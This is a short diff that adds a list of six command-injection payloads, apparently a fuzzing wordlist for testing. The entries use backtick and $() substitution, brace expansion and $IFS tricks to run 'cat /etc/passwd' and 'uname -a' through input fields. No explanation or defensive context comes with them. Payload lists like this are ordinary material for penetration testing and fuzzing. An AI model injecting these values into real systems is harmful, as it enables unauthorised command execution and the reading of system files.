@@ -1,0 +1,6 @@
+`cat /etc/passwd`
+$(cat /etc/passwd)
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+IFS=,;`cat<<<uname,-a`
+
